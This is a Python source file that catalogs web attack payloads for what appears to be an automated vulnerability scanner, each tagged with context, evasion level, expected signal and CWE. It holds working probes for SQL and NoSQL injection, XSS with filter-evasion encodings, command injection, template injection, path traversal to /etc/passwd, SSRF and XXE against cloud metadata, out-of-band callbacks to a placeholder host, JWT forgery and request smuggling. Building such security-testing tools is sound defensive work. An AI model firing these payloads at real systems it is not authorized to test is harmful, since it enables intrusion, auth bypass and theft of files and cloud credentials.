"""
Context-Aware Payload Catalog (Phase 10).

Payloads are organized by attack type and context (HTML, URL, header, JSON, XML).
Each payload has metadata for encoding, evasion level, and expected signal.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional


@dataclass
class Payload:
    payload_id: str
    attack_type: str
    context: str
    raw: str
    encoded_variants: Dict[str, str] = field(default_factory=dict)
    evasion_level: int = 0
    expected_signal: str = ""
    signal_type: str = "body"
    cwe: str = ""
    tags: List[str] = field(default_factory=list)
    notes: str = ""


class PayloadCatalog:

    def __init__(self) -> None:
        self._payloads: Dict[str, Payload] = {}

    def register(self, p: Payload) -> None:
        self._payloads[p.payload_id] = p

    def get(self, payload_id: str) -> Optional[Payload]:
        return self._payloads.get(payload_id)

    def by_attack_type(self, attack_type: str) -> List[Payload]:
        return [p for p in self._payloads.values() if p.attack_type == attack_type]

    def by_context(self, context: str) -> List[Payload]:
        return [p for p in self._payloads.values() if p.context == context]

    def by_evasion_level(self, level: int) -> List[Payload]:
        return [p for p in self._payloads.values() if p.evasion_level == level]

    def for_test(self, attack_type: str, context: str = "",
                 max_evasion: int = 3) -> List[Payload]:
        results = [p for p in self._payloads.values()
                   if p.attack_type == attack_type and p.evasion_level <= max_evasion]
        if context:
            ctx_match = [p for p in results if p.context == context]
            if ctx_match:
                results = ctx_match
        return sorted(results, key=lambda p: p.evasion_level)

    def count(self) -> int:
        return len(self._payloads)


def build_default_payload_catalog() -> PayloadCatalog:
    catalog = PayloadCatalog()
    payloads = [
        # === SQL Injection ===
        Payload("sqli_quote_01", "sqli", "generic", "'",
                expected_signal="SQL syntax|error|mysql|postgres|oracle|sqlite",
                signal_type="body", cwe="CWE-89"),
        Payload("sqli_quote_02", "sqli", "generic", "\"",
                expected_signal="SQL syntax|error", cwe="CWE-89"),
        Payload("sqli_or_true_01", "sqli", "generic", "' OR '1'='1",
                expected_signal="extra_rows|different_response", cwe="CWE-89"),
        Payload("sqli_or_true_02", "sqli", "generic", "' OR 1=1--",
                expected_signal="extra_rows", cwe="CWE-89"),
        Payload("sqli_union_01", "sqli", "generic", "' UNION SELECT NULL--",
                expected_signal="column_count", cwe="CWE-89"),
        Payload("sqli_union_02", "sqli", "generic",
                "' UNION SELECT NULL,NULL,NULL--",
                expected_signal="data_leak", cwe="CWE-89"),
        Payload("sqli_time_01", "sqli", "generic",
                "'; WAITFOR DELAY '0:0:5'--",
                expected_signal="response_delay_5s", signal_type="timing", cwe="CWE-89"),
        Payload("sqli_time_02", "sqli", "generic",
                "' AND SLEEP(5)--",
                expected_signal="response_delay_5s", signal_type="timing", cwe="CWE-89"),
        Payload("sqli_time_03", "sqli", "generic",
                "' AND pg_sleep(5)--",
                expected_signal="response_delay_5s", signal_type="timing", cwe="CWE-89"),
        Payload("sqli_error_01", "sqli", "generic",
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                expected_signal="version_string", cwe="CWE-89"),
        Payload("sqli_stacked_01", "sqli", "generic",
                "'; SELECT 1--",
                expected_signal="multi_query", cwe="CWE-89"),
        Payload("sqli_comment_01", "sqli", "generic",
                "admin'--", expected_signal="auth_bypass", cwe="CWE-89"),
        Payload("sqli_json_01", "sqli", "json",
                '{"id": "1 OR 1=1"}',
                expected_signal="extra_rows", cwe="CWE-89"),
        Payload("sqli_header_ua_01", "sqli", "header",
                "' OR '1'='1",
                expected_signal="error|extra", cwe="CWE-89",
                tags=["user-agent"]),
        Payload("sqli_header_xff_01", "sqli", "header",
                "' OR 1=1--",
                expected_signal="error", cwe="CWE-89",
                tags=["x-forwarded-for"]),

        # === XSS ===
        Payload("xss_basic_01", "xss", "html", "<script>alert(1)</script>",
                expected_signal="<script>alert(1)</script>", cwe="CWE-79"),
        Payload("xss_img_01", "xss", "html",
                '<img src=x onerror=alert(1)>',
                expected_signal="onerror=alert", cwe="CWE-79"),
        Payload("xss_svg_01", "xss", "html",
                '<svg onload=alert(1)>',
                expected_signal="onload=alert", cwe="CWE-79"),
        Payload("xss_event_01", "xss", "html",
                '" onmouseover="alert(1)',
                expected_signal="onmouseover", cwe="CWE-79"),
        Payload("xss_attr_01", "xss", "attribute",
                '" onfocus="alert(1)" autofocus="',
                expected_signal="onfocus", cwe="CWE-79"),
        Payload("xss_js_ctx_01", "xss", "javascript",
                "';alert(1);//",
                expected_signal="alert(1)", cwe="CWE-79"),
        Payload("xss_url_01", "xss", "url",
                "javascript:alert(1)",
                expected_signal="javascript:alert", cwe="CWE-79"),
        Payload("xss_encoded_01", "xss", "html",
                "%3Cscript%3Ealert(1)%3C/script%3E",
                expected_signal="<script>", cwe="CWE-79", evasion_level=1),
        Payload("xss_double_enc_01", "xss", "html",
                "%253Cscript%253Ealert(1)%253C/script%253E",
                expected_signal="<script>", cwe="CWE-79", evasion_level=2),
        Payload("xss_unicode_01", "xss", "html",
                "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
                expected_signal="<script>", cwe="CWE-79", evasion_level=1),
        Payload("xss_case_01", "xss", "html",
                "<ScRiPt>alert(1)</ScRiPt>",
                expected_signal="<script>", cwe="CWE-79", evasion_level=1),
        Payload("xss_null_01", "xss", "html",
                "<scr\\x00ipt>alert(1)</script>",
                expected_signal="alert", cwe="CWE-79", evasion_level=2),
        Payload("xss_mutation_01", "xss", "html",
                '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>',
                expected_signal="alert", cwe="CWE-79", evasion_level=2,
                tags=["mXSS"]),
        Payload("xss_dom_hash_01", "xss", "url",
                "#<img src=x onerror=alert(1)>",
                expected_signal="alert", cwe="CWE-79", tags=["DOM"]),

        # === Command Injection ===
        Payload("cmdi_semi_01", "command_injection", "generic",
                "; id",
                expected_signal="uid=", cwe="CWE-78"),
        Payload("cmdi_pipe_01", "command_injection", "generic",
                "| id",
                expected_signal="uid=", cwe="CWE-78"),
        Payload("cmdi_backtick_01", "command_injection", "generic",
                "`id`",
                expected_signal="uid=", cwe="CWE-78"),
        Payload("cmdi_subshell_01", "command_injection", "generic",
                "$(id)",
                expected_signal="uid=", cwe="CWE-78"),
        Payload("cmdi_newline_01", "command_injection", "generic",
                "%0aid",
                expected_signal="uid=", cwe="CWE-78", evasion_level=1),
        Payload("cmdi_blind_01", "command_injection", "generic",
                "; sleep 5",
                expected_signal="response_delay_5s", signal_type="timing", cwe="CWE-78"),
        Payload("cmdi_dns_01", "command_injection", "generic",
                "; nslookup COLLAB_DOMAIN",
                expected_signal="dns_lookup", signal_type="oob", cwe="CWE-78"),

        # === SSTI ===
        Payload("ssti_detect_01", "ssti", "generic", "{{7*7}}",
                expected_signal="49", cwe="CWE-1336"),
        Payload("ssti_detect_02", "ssti", "generic", "${7*7}",
                expected_signal="49", cwe="CWE-1336"),
        Payload("ssti_jinja2_01", "ssti", "generic",
                "{{config.items()}}",
                expected_signal="SECRET_KEY|DEBUG", cwe="CWE-1336"),
        Payload("ssti_jinja2_02", "ssti", "generic",
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                expected_signal="subprocess|Popen", cwe="CWE-1336"),
        Payload("ssti_freemarker_01", "ssti", "generic",
                "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
                expected_signal="uid=", cwe="CWE-1336"),

        # === Path Traversal ===
        Payload("path_basic_01", "path_traversal", "generic",
                "../../../../etc/passwd",
                expected_signal="root:x:", cwe="CWE-22"),
        Payload("path_null_01", "path_traversal", "generic",
                "../../../../etc/passwd%00.jpg",
                expected_signal="root:x:", cwe="CWE-22", evasion_level=1),
        Payload("path_double_enc_01", "path_traversal", "generic",
                "..%252f..%252f..%252fetc%252fpasswd",
                expected_signal="root:x:", cwe="CWE-22", evasion_level=2),
        Payload("path_utf8_01", "path_traversal", "generic",
                "..%c0%af..%c0%afetc/passwd",
                expected_signal="root:x:", cwe="CWE-22", evasion_level=2),
        Payload("path_windows_01", "path_traversal", "generic",
                "..\\..\\..\\windows\\win.ini",
                expected_signal="[fonts]", cwe="CWE-22"),

        # === SSRF ===
        Payload("ssrf_localhost_01", "ssrf", "url",
                "http://127.0.0.1",
                expected_signal="localhost_content", cwe="CWE-918"),
        Payload("ssrf_metadata_aws_01", "ssrf", "url",
                "http://169.254.169.254/latest/meta-data/",
                expected_signal="ami-id|instance-id", cwe="CWE-918"),
        Payload("ssrf_metadata_gcp_01", "ssrf", "url",
                "http://metadata.google.internal/computeMetadata/v1/",
                expected_signal="project|zone", cwe="CWE-918"),
        Payload("ssrf_redirect_01", "ssrf", "url",
                "http://COLLAB_DOMAIN/redirect?to=http://169.254.169.254/",
                expected_signal="metadata", cwe="CWE-918", evasion_level=1),
        Payload("ssrf_decimal_01", "ssrf", "url",
                "http://2130706433/",
                expected_signal="localhost", cwe="CWE-918", evasion_level=1),
        Payload("ssrf_ipv6_01", "ssrf", "url",
                "http://[::1]/",
                expected_signal="localhost", cwe="CWE-918", evasion_level=1),

        # === XXE ===
        Payload("xxe_basic_01", "xxe", "xml",
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                expected_signal="root:x:", cwe="CWE-611"),
        Payload("xxe_oob_01", "xxe", "xml",
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLAB_DOMAIN/xxe">%xxe;]><foo/>',
                expected_signal="dns_lookup", signal_type="oob", cwe="CWE-611"),
        Payload("xxe_param_01", "xxe", "xml",
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                expected_signal="metadata", cwe="CWE-611"),

        # === NoSQL Injection ===
        Payload("nosqli_ne_01", "nosqli", "json",
                '{"username": {"$ne": ""}, "password": {"$ne": ""}}',
                expected_signal="auth_bypass", cwe="CWE-943"),
        Payload("nosqli_gt_01", "nosqli", "json",
                '{"username": "admin", "password": {"$gt": ""}}',
                expected_signal="auth_bypass", cwe="CWE-943"),
        Payload("nosqli_regex_01", "nosqli", "json",
                '{"username": {"$regex": "^admin"}}',
                expected_signal="user_data", cwe="CWE-943"),
        Payload("nosqli_where_01", "nosqli", "json",
                '{"$where": "this.password.length > 0"}',
                expected_signal="data_leak", cwe="CWE-943"),

        # === LDAP Injection ===
        Payload("ldap_wildcard_01", "ldap", "generic", "*",
                expected_signal="multiple_results", cwe="CWE-90"),
        Payload("ldap_escape_01", "ldap", "generic",
                "admin)(|(password=*)",
                expected_signal="data_leak", cwe="CWE-90"),

        # === Open Redirect ===
        Payload("redir_absolute_01", "open_redirect", "url",
                "https://evil.com",
                expected_signal="redirect_external", signal_type="header", cwe="CWE-601"),
        Payload("redir_protocol_01", "open_redirect", "url",
                "//evil.com",
                expected_signal="redirect_external", signal_type="header",
                cwe="CWE-601", evasion_level=1),
        Payload("redir_encoded_01", "open_redirect", "url",
                "https%3A%2F%2Fevil.com",
                expected_signal="redirect_external", signal_type="header",
                cwe="CWE-601", evasion_level=1),
        Payload("redir_backslash_01", "open_redirect", "url",
                "https:\\\\evil.com",
                expected_signal="redirect_external", signal_type="header",
                cwe="CWE-601", evasion_level=2),

        # === CRLF / Header Injection ===
        Payload("crlf_basic_01", "header_injection", "generic",
                "%0d%0aX-Injected: true",
                expected_signal="X-Injected", signal_type="header", cwe="CWE-113"),
        Payload("crlf_set_cookie_01", "header_injection", "generic",
                "%0d%0aSet-Cookie: evil=true",
                expected_signal="Set-Cookie: evil", signal_type="header", cwe="CWE-113"),

        # === JWT ===
        Payload("jwt_none_01", "jwt", "header",
                '{"alg":"none","typ":"JWT"}',
                expected_signal="valid_response", cwe="CWE-327",
                notes="Base64url encode, remove signature"),
        Payload("jwt_hs256_01", "jwt", "header",
                '{"alg":"HS256","typ":"JWT"}',
                expected_signal="valid_response", cwe="CWE-327",
                notes="Sign with RS256 public key as HMAC secret"),

        # === Host Header ===
        Payload("host_inject_01", "host_header", "header",
                "evil.com",
                expected_signal="evil.com", signal_type="body", cwe="CWE-644",
                tags=["Host"]),
        Payload("host_double_01", "host_header", "header",
                "evil.com",
                expected_signal="evil.com", signal_type="body", cwe="CWE-644",
                tags=["X-Forwarded-Host"]),

        # === CORS ===
        Payload("cors_reflect_01", "cors", "header",
                "https://evil.com",
                expected_signal="Access-Control-Allow-Origin: https://evil.com",
                signal_type="header", cwe="CWE-942", tags=["Origin"]),
        Payload("cors_null_01", "cors", "header",
                "null",
                expected_signal="Access-Control-Allow-Origin: null",
                signal_type="header", cwe="CWE-942", tags=["Origin"]),

        # === CSRF ===
        Payload("csrf_no_token_01", "csrf", "generic",
                "REMOVE_CSRF_TOKEN",
                expected_signal="200|302", signal_type="status", cwe="CWE-352",
                notes="Submit form without CSRF token"),
        Payload("csrf_wrong_token_01", "csrf", "generic",
                "aaaaaaaaaaaaaaaa",
                expected_signal="200", signal_type="status", cwe="CWE-352",
                notes="Submit form with random CSRF token"),

        # === HTTP Smuggling ===
        Payload("smuggle_clte_01", "http_smuggling", "raw",
                "POST / HTTP/1.1\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
                expected_signal="desync|405|400", cwe="CWE-444"),

        # === Prototype Pollution ===
        Payload("proto_basic_01", "prototype_pollution", "json",
                '{"__proto__": {"isAdmin": true}}',
                expected_signal="privilege_change", cwe="CWE-1321"),
        Payload("proto_constructor_01", "prototype_pollution", "json",
                '{"constructor": {"prototype": {"isAdmin": true}}}',
                expected_signal="privilege_change", cwe="CWE-1321"),
    ]

    for p in payloads:
        catalog.register(p)
    return catalog
